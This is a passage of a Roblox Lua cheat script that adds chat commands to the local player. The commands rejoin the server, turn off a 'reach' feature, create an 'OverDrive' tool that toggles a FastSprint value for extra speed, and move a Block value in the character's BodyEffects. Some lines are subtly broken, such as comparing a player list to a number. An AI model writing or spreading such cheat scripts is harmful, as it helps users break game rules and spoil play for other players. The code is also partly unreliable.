        elseif v.KeyCode == Enum.KeyCode.Q and Posing == true then
            Posing = false;
        end;
    end;
end)
end
end)
local Humanoid = game.Players.LocalPlayer.Character.Humanoid
game.Players.LocalPlayer.Chatted:Connect(function(msg)
    if msg == ".rejoin" then
        if Players:GetPlayers() <= 1 then
		Players.LocalPlayer:Kick("\nRejoining...")
		wait(1)
		game:GetService('TeleportService'):Teleport(game.PlaceId, Players.LocalPlayer)
	else
		game:GetService('TeleportService'):TeleportToPlaceInstance(game.PlaceId, game.JobId, Players.LocalPlayer)
	end
end
end)
local Humanoid = game.Players.LocalPlayer.Character.Humanoid
game.Players.LocalPlayer.Chatted:Connect(function(msg)
    if msg == ".unreach" then
        reaching = false
    end
end)
local Humanoid = game.Players.LocalPlayer.Character.Humanoid
game.Players.LocalPlayer.Chatted:Connect(function(msg)
    if msg == "/e sprint" then
            local backpack = game.Players.LocalPlayer:FindFirstChild("Backpack")
    local Tool = backpack:FindFirstChild("OverDrive") or game.Players.LocalPlayer.Character:FindFirstChild("OverDrive")
    if not Tool then
        local OverDrive = Instance.new("Tool", game.Players.LocalPlayer.Backpack)
        OverDrive.Name = "OverDrive"
        OverDrive.RequiresHandle = false
        local overdrive = true
        local ps = game:GetService("Players")
        local lp = ps.LocalPlayer
        local char = lp.Character
        OverDrive.Activated:Connect(function()
            if overdrive == true then
                overdrive = false
                char.BodyEffects.Movement.FastSprint:Destroy()
            elseif overdrive == false then
                overdrive = true
                local FastSprint = Instance.new("IntValue")
                FastSprint.Name = "FastSprint"
                FastSprint.Parent = char.BodyEffects.Movement
            end
        end)
end
end
end)
local Humanoid = game.Players.LocalPlayer.Character.Humanoid
game.Players.LocalPlayer.Chatted:Connect(function(msg)
    if msg == "/e hide" then
        local ps = game:GetService("Players")
        local lp = ps.LocalPlayer
        local char = lp.Character
        local Block = char.BodyEffects:FindFirstChild("Block")
                Block.Name = "Block"
                Block.Parent = char.BodyEffects.Movement
end
end)